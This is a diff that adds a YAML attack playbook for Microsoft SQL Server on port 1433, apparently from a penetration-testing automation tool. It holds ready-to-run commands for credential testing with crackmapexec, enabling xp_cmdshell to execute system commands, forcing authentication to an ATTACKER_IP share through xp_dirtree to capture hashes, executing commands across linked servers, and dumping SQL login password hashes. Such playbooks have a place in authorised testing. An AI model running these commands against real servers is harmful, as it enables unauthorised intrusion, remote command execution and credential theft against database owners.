@@ -1,0 +1,38 @@
+service: mssql
+ports: [1433]
+categories:
+  enumeration:
+    - id: mssql_nmap
+      description: "Nmap MSSQL scripts"
+      command: "nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 {IP}"
+      priority: high
+    - id: mssql_login
+      description: "Test credentials"
+      command: "crackmapexec mssql {IP} -u '{USER}' -p '{PASS}'"
+      priority: high
+    - id: mssql_enum
+      description: "Enumerate databases"
+      command: "impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth"
+      priority: high
+  exploitation:
+    - id: mssql_xpcmdshell
+      description: "Enable and use xp_cmdshell"
+      command: "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'"
+      priority: high
+    - id: mssql_relay
+      description: "Capture hash via xp_dirtree"
+      command: "EXEC xp_dirtree '\\\\ATTACKER_IP\\share'"
+      priority: high
+    - id: mssql_linked
+      description: "Enumerate linked servers"
+      command: "SELECT * FROM sys.servers; EXEC ('whoami') AT [LINKED_SERVER]"
+      priority: medium
+    - id: mssql_impersonate
+      description: "Check impersonation privileges"
+      command: "SELECT * FROM sys.server_permissions WHERE type = 'IM'"
+      priority: medium
+  post_exploitation:
+    - id: mssql_hashes
+      description: "Extract SQL user hashes"
+      command: "SELECT name, password_hash FROM sys.sql_logins"
+      priority: high
